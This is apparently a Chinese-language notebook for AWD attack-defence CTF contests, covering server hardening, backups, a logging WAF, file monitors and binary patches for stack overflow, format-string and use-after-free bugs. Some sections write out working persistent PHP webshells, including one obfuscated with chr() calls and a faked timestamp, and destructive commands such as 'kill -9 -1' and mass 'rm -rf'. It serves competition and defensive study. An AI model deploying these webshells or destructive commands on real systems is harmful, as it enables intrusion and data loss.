# AWD

##  修改ssh密码

~~~cmd
passwd username
# 输入密码确认即可
~~~

## 修改数据库密码及备份数据库（以 mysql 为例）

修改 mysql 密码

```mysql
1. 登录 mysql 终端，运行：
mysql> set password=password('new passwd');
mysql>flush privileges;
2. 修改 mysql user 表
mysql>use mysql;
mysql>update user set password=password('new password') where user='root';
mysql>flush privileges;
3. 使用 GRANT 语句
mysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'127.0.0.1' IDENTIFIED BY 'new password' WITH GRANT OPTION;
mysql>flush privileges;
4. mysqladmin
[root@ubuntu]# mysqladmin -u root passwd "new passwd";（注意双引号或不加）
```

备份指定的多个数据库

```
[root@ubuntu]# mysqldump -u root -p --databases databasesname > /tmp/db.sql
```

数据库恢复，在mysql终端下执行

## 源码备份

```shell
# 打包目录
tar -zcvf archive_name.tar.gz directory_to_compress
# 解包
tar -zxvf archive_name.tar.gz
```

之后使用 scp 命令或者 winscp，mobaxterm 等工具下载打包后的源码

## 上 WAF

~~~shell
# 批量加waf /var/www/html/ 目录下每个 php 文件前加上 <?php require_once "/tmp/waf.php";?>
find /var/www/html -path /var/www/html -prune -o  -type f -name '*.php'|xargs  sed -i '1i<?php require_once "/tmp/waf.php";?>'
~~~

也可以修改 php.ini 的 auto_prepend_file 属性，但一般不会有重启 php 服务权限

```shell
; Automatically add files before PHP document.
; http://php.net/auto-prepend-file
auto_prepend_file = /tmp/waf.php
```

附上郁离歌的一枚 WAF，会在 `/tmp/loooooooogs` 目录下生成日志文件

```php
<?php

error_reporting(0); 
define('LOG_FILEDIR','/tmp/loooooooogs');
if(!is_dir(LOG_FILEDIR)){
	mkdir(LOG_FILEDIR);
}
function waf() 
{ 
if (!function_exists('getallheaders')) { 
function getallheaders() { 
foreach ($_SERVER as $name => $value) { 
if (substr($name, 0, 5) == 'HTTP_') 
$headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value;
} 
return $headers; 
} 
} 
$get = $_GET; 
$post = $_POST; 
$cookie = $_COOKIE; 
$header = getallheaders(); 
$files = $_FILES; 
$ip = $_SERVER["REMOTE_ADDR"]; 
$method = $_SERVER['REQUEST_METHOD']; 
$filepath = $_SERVER["SCRIPT_NAME"]; 
foreach ($_FILES as $key => $value) { 
$files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); 
file_put_contents($_FILES[$key]['tmp_name'], "virink"); 
}

unset($header['Accept']);
$input = array("Get"=>$get, "Post"=>$post, "Cookie"=>$cookie, "File"=>$files, "Header"=>$header);

logging($input);

}

function logging($var){ 
$filename = $_SERVER['REMOTE_ADDR'];
$LOG_FILENAME = LOG_FILEDIR."/".$filename;
$time = date("Y-m-d G:i:s");
file_put_contents($LOG_FILENAME, "\r\n".$time."\r\n".print_r($var, true), FILE_APPEND); 
file_put_contents($LOG_FILENAME,"\r\n".'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'], FILE_APPEND);
file_put_contents($LOG_FILENAME,"\r\n***************************************************************",FILE_APPEND);
}

waf(); 
?>
```

生成的日志是 www-data 权限，一般 ctf 权限是删除不了的。上好 WAF 之后做好打包备份，除了源文件一份备份，我一般上好 WAF ，打好补丁还会做备份。

## 不死马

直接linux执行

~~~shell
while true;do echo '<?php eval($_POST["x"]);?>' > x.php;sleep 1;done
~~~

或
**bs1.php**
访问后同目录持续生成 `.test.php` 文件

```php
<?php
set_time_limit(0);
//程序执行时间
ignore_user_abort(1);
//关掉终端后脚本仍然运行
unlink(__FILE__);
//文件完整名
while(1) {
 file_put_contents('.test.php','<?php $a=array($_REQUEST["x"]=>"3");   // pwd=x
$b=array_keys($a)[0];
eval($b);?>');
 sleep(5);
}
?>
```

**bs2.php**
访问后同目录持续生成 `.config.php` 文件

```php
<?php
 set_time_limit(0);
 ignore_user_abort(1);
 unlink(_FILE);
 while(1){
  file_put_contents('./.config.php','<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>');
  system('chmod777.config.php');
  touch("./.config.php",mktime(20,15,1,11,28,2016));   // pwd=1
  usleep(100);
  }
?>
```

## 命令find进行文件监控

寻找最近20分钟修改的文件

```
find /var/www/html -name *.php -mmin -20
```

## Shell监控新增文件

创建文件的时候更改文件创建时间熟悉可能监测不到。

```shell
#!/bin/bash
while true
do
    find /var/www/html -cmin -60 -type f | xargs rm -rf
    sleep 1
done
```

循环监听一小时以内更改过的文件或新增的文件，进行删除。

## Python检测新增文件

放在 `/var/www/` 或 `/var/www/html` 下执行这个脚本，它会先备份当然目录下的所有文件，然后监控当前目录，一旦当前目录下的某个文件发生变更，就会自动还原，有新的文件产生就会自动删除。

~~~python
# -*- coding: utf-8 -*-
#use: python file_check.py ./

import os
import hashlib
import shutil
import ntpath
import time

CWD = os.getcwd()
FILE_MD5_DICT = {} # 文件MD5字典
ORIGIN_FILE_LIST = []

# 特殊文件路径字符串
Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'
bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'
logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'
difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'

Special_string = 'drops_log' # 免死金牌
UNICODE_ENCODING = "utf-8"
INVALID_UNICODE_CHAR_FORMAT = r"\?%02x"

# 文件路径字典
spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))
Special_path = {
    'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)),
    'log' : os.path.realpath(os.path.join(spec_base_path, logstring)),
    'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)),
    'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),
}


def isListLike(value):
    return isinstance(value, (list, tuple, set))

# 获取Unicode编码
def getUnicode(value, encoding=None, noneToNull=False):
    if noneToNull and value is None:
        return NULL
    if isListLike(value):
        value = list(getUnicode(_, encoding, noneToNull) for _ in value)
        return value
    if isinstance(value, unicode):
        return value
    elif isinstance(value, basestring):
        while True:
            try:
                return unicode(value, encoding or UNICODE_ENCODING)
            except UnicodeDecodeError, ex:
                try:
                    return unicode(value, UNICODE_ENCODING)
                except:
                    value = value[:ex.start] + "".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:]
    else:
        try:
            return unicode(value)
        except UnicodeDecodeError:
            return unicode(str(value), errors="ignore")

# 目录创建
def mkdir_p(path):
    import errno
    try:
        os.makedirs(path)
    except OSError as exc:
        if exc.errno == errno.EEXIST and os.path.isdir(path):
            pass
        else: raise

# 获取当前所有文件路径
def getfilelist(cwd):
    filelist = []
    for root,subdirs, files in os.walk(cwd):
        for filepath in files:
            originalfile = os.path.join(root, filepath)
            if Special_path_str not in originalfile:
                filelist.append(originalfile)
    return filelist

# 计算机文件MD5值
def calcMD5(filepath):
    try:
        with open(filepath,'rb') as f:
            md5obj = hashlib.md5()
            md5obj.update(f.read())
            hash = md5obj.hexdigest()
            return hash
    except Exception, e:
        print u'[!] getmd5_error : ' + getUnicode(filepath)
        print getUnicode(e)
        try:
            ORIGIN_FILE_LIST.remove(filepath)
            FILE_MD5_DICT.pop(filepath, None)
        except KeyError, e:
            pass

# 获取所有文件MD5
def getfilemd5dict(filelist = []):
    filemd5dict = {}
    for ori_file in filelist:
        if Special_path_str not in ori_file:
            md5 = calcMD5(os.path.realpath(ori_file))
            if md5:
                filemd5dict[ori_file] = md5
    return filemd5dict

# 备份所有文件
def backup_file(filelist=[]):
    # if len(os.listdir(Special_path['bak'])) == 0:
    for filepath in filelist:
        if Special_path_str not in filepath:
            shutil.copy2(filepath, Special_path['bak'])

if __name__ == '__main__':
    print u'---------start------------'
    for value in Special_path:
        mkdir_p(Special_path[value])
    # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件
    ORIGIN_FILE_LIST = getfilelist(CWD)
    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)
    backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG
    print u'[*] pre work end!'
    while True:
        file_list = getfilelist(CWD)
        # 移除新上传文件
        diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST))
        if len(diff_file_list) != 0:
            # import pdb;pdb.set_trace()
            for filepath in diff_file_list:
                try:
                    f = open(filepath, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] webshell find : ' + getUnicode(filepath)
                        shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt'))
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filepath)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : file move error: ' + getUnicode(e)

        # 防止任意文件被修改,还原被修改文件
        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)
        for filekey in md5_dict:
            if md5_dict[filekey] != FILE_MD5_DICT[filekey]:
                try:
                    f = open(filekey, 'r').read()
                except Exception, e:
                    break
                if Special_string not in f:
                    try:
                        print u'[*] file had be change : ' + getUnicode(filekey)
                        shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt'))
                        shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey)
                    except Exception as e:
                        print u'[!] move webshell error, "%s" maybe is webshell.'%getUnicode(filekey)
                    try:
                        f = open(os.path.join(Special_path['log'], 'log.txt'), 'a')
                        f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\n')
                        f.close()
                    except Exception as e:
                        print u'[-] log error : done_diff: ' + getUnicode(filekey)
                        pass
        time.sleep(2)
        # print '[*] ' + getUnicode(time.ctime())
~~~

## 修改curl

获取flag一般都是通过执行 `curl http://xxx.com/flag.txt`
更改其别名，使其无法获取flag内容：

```shell
alias curl = 'echo flag{e4248e83e4ca862303053f2908a7020d}' 使用别名，
chmod -x curl  降权，取消执行权限
```

## 克制不死马、内存马

使用条件竞争的方式，不断循环创建和不死马同名的文件和文件夹，在此次比赛中使用此方式克制
了不死马。

~~~shell
#!/bin/bash
dire="/var/www/html/.base.php/"
file="/var/www/html/.base.php"
rm -rf $file
mkdir $dire
./xx.sh
~~~

## 创建后台进程

创建后台进程

```bash
nohup sudo ./Cardinal > output.log 2>&1 &
```

## 杀不死马

建立一个和不死马一样名字的文件夹，这样不死马就写不进去了。完全杀死不死马，得清理内存。

```bash
rm -rf .2.php | mkdir .2.php
```

杀进程得在root或者www-data权限下。如上传一句话，然后执行 system(‘kill -9 -1’); 杀死所有进程，再手动删除木马

```php
shell.php: <?php @eval($_GET['9415']); ?>
url访问：shell.php?9415=system('kill -9 -1');
```

用一个脚本竞争写入，脚本同不死马，usleep要低于对方不死马设置的值.
top 查看占用率最高的cpu进程
q 退出
M 根据驻留内存大小进行排序
P 根据CPU使用百分比大小进行排序

```php
<?php
	   while (1) {
		$pid = 不死⻢的进程PID;
		@unlink("c.php");
		exec("kill -9 $pid");
		usleep(1000);
	}?>
```

重启 apache，php 等web服务（一般不会有权限）

## 监测payload

`tail -f *.log`，看日志，不言而喻，抓他们的payload并利用。

## 中间件日志

⽐如apache，nginx
查看当前访问量前⼗的链接

```bash
cat /var/log/apache2/access.log |awk '{print $7}'|sort|uniq -c| sort -r|head
```

# AWD2

## 检查可登陆用户

- `cat /etc/passwd|grep -v nologin`

## 检查crontab执行权限

- `/var/adm/cron/` 下看`cron.allow` 和`cron.deny`， 如果两个文件都不存在，则只有root 用户能执行crontab 命令，allow 里存放允许的用户，deny 里存放拒绝的用户，以allow 为准。

## 备份/还原源码
```bash
tar -zcvf web.tar.gz /var/www/html/
tar -zxvf web.tar.gz
```
## 备份/还原数据库
```bash
mysql -uroot -proot -e "select user,host from mysql.user;"
mysqldump -uroot -proot db_name > /tmp/bak.sql
mysqldump -uroot -proot --all-databases > bak.sql
mysql -uroot -proot db_name < bak.sql
>	source bak.sql		# 交互模式下导入sql
```
## 关闭mysql远程连接
```sql
mysql -u root -p
mysql> use mysql;
mysql> update user set host = 'localhost' where user='root' and host='%';
mysql> flush privileges;
mysql> exit;
```
## 删除不死马
```bash
rm -rf .index.php | mkdir .index.php		# 竞争写入同名文件
kill -9 -1
kill apache2
ps aux | grep www-data | awk '{print $2}' | xargs kill -9
```
## 重启服务器
```bash
while : ;do kill -9 <PID>; done;
while : ;do echo 'aa'> shell.php; done;
```

# AWD+

https://github.com/admintony/Prepare-for-AWD

## PHP软waf

- 项目地址：https://github.com/leohearts/awd-watchbird/

```html
https://github.com/leohearts/awd-watchbird
```

- 将waf.so、watchbird.php文件存放在`/var/www/html`或其他目录中。
- 将watchbird.php放在www-data可读的目录, 确保当前用户对目标目录可写, 然后执行。

```
php watchbird.php --install /web
```

- 访问任意启用了waf的文件, 参数`?watchbird=ui`。
- 如需卸载, 请在相同的位置输入：

```
php watchbird.php --uninstall [Web目录]
```


## pcap-search

- 项目地址：https://github.com/ss8651twtw/pcap-search

- 首先在kali中安装docker：
- 使用docker的官方教程安装失败，报错`Updating from such a repository can't be done securely, and is therefore disabled by default.`。

```bash
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
sudo sh -c "echo 'deb https://download.docker.com/linux/debian stretch stable' > /etc/apt/sources.list.d/docker.list"
sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common
sudo apt-get update
sudo apt install docker.io
```

- 安装pcap-search：

```bash
git clone https://github.com/ss8651twtw/pcap-search.git
cd pcap-search/docker
./build_docker.sh
```

- 运行pcap-search后，使用指定的端口即可访问：

```bash
./run_docker.sh [the pcap directory you want to mount] [port] [name]
./run_docker.sh /home/secc/Desktop/cap 8080 pcap-search
```

- 抓包：

  ```
  socat tcp-l:9875,fork exec:/home/secc/Desktop/ciscn_2019_es_2
  tcpdump -i eth1 port 9875 -w 1.cap	# 注意这里一定要指定网卡（-i eth1)，使用-i any是解析不出来的
  ```

  - 打完流量后，按Ctrl+C停止抓包，并保存流量包文件。

- 将流量包建在二级目录下：
  - 将我们之前运行时指定的目录看作为根目录的话，需要在根目录下再新建一个文件夹，例如项目“pwn1”。将生成的cap文件拷贝到文件夹中，项目自己会自动生存`cap.ap`和`cap.ap.fm`文件。再次访问网页就可以查询到包中的流量了。
  
  ```
  cap
  └── pwn1
      ├── 1.cap
      ├── 1.cap.ap
      └── 1.cap.ap.fm
  ```

![image-20210901201301492](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109012013793.png)

- 可以根据流量包自动生成脚本重放（由于只是对流量的完全重放，所以如果有泄露地址，这个功能就有些鸡肋了）：

<img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109011946750.png" alt="image-20210901194633454" style="zoom:33%;" />

## patch漏洞

### 栈溢出

- 题目：攻防世界-level2

- 漏洞函数如下：

```c
ssize_t vulnerable_function()
{
  char buf[136]; // [esp+0h] [ebp-88h] BYREF

  system("echo Input:");
  return read(0, buf, 0x100u);
}
```

- 很明显存在溢出点，可以溢出到返回地址，劫持程序的执行流。那么patch这个漏洞的方法就是将可以读入的空间减小，让他无法溢出即可。

- patch流程：

  - 首先找到程序中数据的位置，右键选择keypatch -> patcher：

  ![image-20210902214242492](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022142748.png)

  - 然后修改`push 0x100`为`push 0x88`，`syntax`选中`Intel`或者`Nasm`（注意keypatch并不识别`88h`这样的数据形式，所以要将其修改为`0x88`或者`88`），且勾选中`NOPs padding`选项，这样当后面patch的指令长度小于原长度就会用nop填充：

  ![image-20210902214531820](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022145033.png)
  - 修改完保存即可：


  ![image-20210902215043115](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022150377.png)

  - 这样就将栈溢出漏洞进行了修复。

### 格式化字符串

- 格式化字符串即printf类函数，没有增加限定，直接输出指针`printf(&p)`。

#### 方法一

##### 32位

- 题目：攻防世界-CGfsb

- 以下是32位程序的格式化字符漏洞函数，其中`printf(s);`直接将我们的输入作为了格式化字符串：


```c
  puts("leave your message please:");
  fgets(s, 100, stdin);
  printf("hello %s", (const char *)buf);
  puts("your message is:");
  printf(s);
  if ( pwnme == 8 )
  {
    puts("you pwned me, here is your flag:\n");
    system("cat flag");
  }
  else
  {
    puts("Thank you!");
  }
```

- 修补的思路是把原来的`printf(s);`给patch成`printf("%s",s);`。这里有几点要注意：

  - 32位的程序，传入参数时是从右往左压栈，所以我们path的`"%s"`需要在压入`s`变量后压栈。
  - 一般选择patch`call printf`为`jmp`指令，因为jmp和call指令都是五个字节，修改的话不用增加很多nop，也不会导致位置不够需要patch其余的代码。（如果遇到patch时位数不够的情况，可以多条指令一起patch，选择keypatch -> fill range即可）
  - jmp到`eh_frame_hdr`段，在该段写我们的payload。
  - 由于需要在`eh_frame_hdr`段使用`call printf`指令，那么就会压入`eh_frame_hdr`段的地址，等待执行结束再跳转回来，所以这时候我们就需要再使用一个jmp指令，无条件跳转回去。

- patch的流程：

  - 首先我们需要在`eh_frame_hdr`段patch两段地址，一个是`%s`，一个是我们新增的代码段：
  - patch两个数据，即`%s`字符串，后面以`\x00`结尾，记一下首地址是`0x08048850`：

  ![image-20210902193435375](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109021934602.png)

  - 在另一个位置（例如`0x08048854`），patch以下代码：

  ```
  lea eax, dword ptr [0x08048850];    # 给eax传%s字符串的地址
  push eax;    # 压入%s字符串的地址
  call 0x08048460;   # call printf地址
  jmp 0x080486D2;   # jmp回call printf的下一条指令
  ```

  - 选中一串`eh_frame_hdr`的数据，长度大于我们的内容即可，右键点击patch -> fill range，在汇编中填入以下参数：

  ```
  lea eax, dword ptr [0x08048850];push eax;call 0x08048460;jmp 0x080486D2;
  ```

  - 这里可以看到我们选中的大小是21字节，而需要填入17字节，满足要求。

  ![image-20210902191025099](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109021910369.png)

  

  - 最后patch原指令`call printf`为`jmp 0x08048900`（`0x08048900`即为我们刚刚patch的代码首地址）

  ![image-20210902193031668](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109021930908.png)

  - F5刷新下，可以看到已经打好补丁了。

  <img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109021932146.png" alt="image-20210902193214009" style="zoom:50%;" />

##### 64位

- 题目链接：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck

- 以下是64位程序的格式化字符漏洞函数，漏洞成因基本相似：

```c
  __isoc99_scanf("%ms", &format);
  for ( j = 0; j <= 21; ++j )
  {
    v4 = format[j];
    if ( !v4 || v10[j] != v4 )
    {
      puts("You answered:");
      printf(format);
      puts("\nBut that was totally wrong lol get rekt");
      fflush(_bss_start);
      return 0;
    }
  }
```

- 思路：

  - 64位和32位的差异在于前六个参数使用寄存器传参。寄存器顺序分别为RDI、RSI、RDX、RCX、R8、R9，接下来的参数才使用栈传参。
  - 对于`printf(format);`函数而言，用户可以控制的`format`参数保存在RDI寄存器中，那么我们要做的就是将RDI寄存器改为我们拟定的格式化字符串`"%s"`，再将`format`参数保存在RSI寄存器中。
  - 可以看到函数将format字符串地址从临时变量中取出，然后赋值给了RDI：

  ```
  .text:000000000040087F                 mov     rax, [rbp+format]
  .text:0000000000400883                 mov     rdi, rax        ; format
  .text:0000000000400886                 mov     eax, 0
  .text:000000000040088B                 call    _printf
  ```

- patch的流程：

  - 在`eh_frame_hdr`段patch`%s`格式化字符串，记下地址`0x0400A06`。
  - 在另一个位置（例如`0x0400A09`），patch以下代码：

  ```
  lea rax,qword ptr [0x0400A06]; mov rdi, rax;mov eax, 0;call 0x0400640;jmp 0x040088B
  ```

  ![image-20210902200107704](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022001929.png)

  - 接着将`mov rdi, rax`patch为`mov rsi, rax`：

  ![image-20210902195003273](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109021950506.png)

  - 最后patch`call printf`指令为`jmp 0x0400A09`：

  ![image-20210902201203167](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022012416.png)
  - 成功：

  <img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022013715.png" alt="image-20210902201351582" style="zoom:50%;" />

#### 方法二（32/64位通用）

- 我们知道在程序的plt表地址中，第一条指令是`jmp 0x601030`，也就是跳转到自己的got表地址，不管有没有延迟绑定的机制，跳转后一定会执行got表地址所对应的函数。所以我们这里可以使用got表劫持，将printf的got表地址修改为puts函数的got表地址，puts函数是没有格式化字符串参数的，自然也就无法利用了。

- patch流程：

  - 先找到puts函数的got表地址`0x601018`（IDA内按Ctrl+S键，选择got.plt段就可以看到）：

  ![image-20210902202554212](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022025439.png)

  - 在printf函数的got表地址按下X键，跳转到引用它的位置，即plt表中，patch首条命令为`jmp qword ptr cs:[off_601018]`：

  ![image-20210902202959702](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022029933.png)

  - 这样我们解析printf函数的时候就可以看到内部已经被替换为了puts函数：

  <img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022031636.png" alt="image-20210902203116516" style="zoom:50%;" />

### 堆漏洞

#### UAF

- UAF（Use After Free）是在释放掉堆块后仍然能使用该指针读写的漏洞，一般成因是程序员忘记将指针清空。
- 思路：我们只需要在调用free函数后，将指针清零即可。

##### 32位

- 题目链接：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote
- 漏洞函数如下，`free(*(&notelist + v1));`后并没有清空地址：

```c
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf[4]; // [esp+8h] [ebp-10h] BYREF
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, buf, 4u);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&notelist + v1) )
  {
    free(*((void **)*(&notelist + v1) + 1));
    free(*(&notelist + v1));
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

- patch流程：

  - 取得指针并`call free`的汇编指令如下：

  ```
  .text:0804889B                 mov     eax, [ebp+var_14]
  .text:0804889E                 mov     eax, ds:notelist[eax*4]
  .text:080488A5                 sub     esp, 0Ch
  .text:080488A8                 push    eax             ; ptr
  .text:080488A9                 call    _free
  ```

  - 仿照这种形式我们获得一段patch的代码，因为在`call free`后，栈底ebp是会恢复的，所以仍然可以仿照call指令之前来写（注意要将变量全部替换掉，并记下首地址`0x08048C90`）：

  ```
  var_14 -> 局部变量 -> -14h
  ds:notelist -> 全局变量 -> 0x0804A070
  free的下一条指令地址 -> 0x080488AE
  ```

  ```
  call 0x080484C0		# call free地址
  mov eax, [ebp-0x14]		# 将0x14赋值给eax
  mov edx, 0		# 将0赋值给edx
  mov [0x0804A070 + eax*4], edx	# 将0赋值给*(&notelist + 0x14)
  jmp 0x080488AE		# jmp回call free的下一条指令
  ```

  ```
  call 0x080484C0; mov eax, [ebp-0x14]; mov edx, 0; mov [0x0804A070 + eax*4], edx; jmp 0x080488AE
  ```

  ![image-20210902212549284](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022125512.png)

  - patch`call _free`指针为`jmp 0x08048C90`：

  ![image-20210902212850989](https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022128223.png)

  - 成功：

  <img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/Picgo/202109022129023.png" alt="image-20210902212941928" style="zoom:50%;" />

##### 64位

- 64位的思路基本一样，在这里我就只贴一下payload。
- 题目：网鼎杯2020-magic

- 漏洞函数：

```c
  printf("index :");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 < 0 || v1 >= dword_6020C0 )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( *(&ptr + v1) )
  {
    free(*(void **)*(&ptr + v1));
    free(*(&ptr + v1));
    puts("You successfully forgot this magic");
  }
```

- 取得指针并`call free`的汇编指令（这里的cdqe是符号拓展指令）：

```
.text:0000000000400B23                 mov     eax, [rbp+var_14]
.text:0000000000400B26                 cdqe
.text:0000000000400B28                 mov     rax, ds:ptr[rax*8]
.text:0000000000400B30                 mov     rdi, rax        ; ptr
.text:0000000000400B33                 call    _free
```

- 最后patch的payload（`mov [0x06020E0 + rax*8], r8`也可以写成`mov ds:ptr[rax*8], r8`）：

```
call 0x04006C0; mov eax, [rbp-0x14]; mov r8, 0; cdqe;mov [0x06020E0 + rax*8], r8;jmp 0x0400B38
```
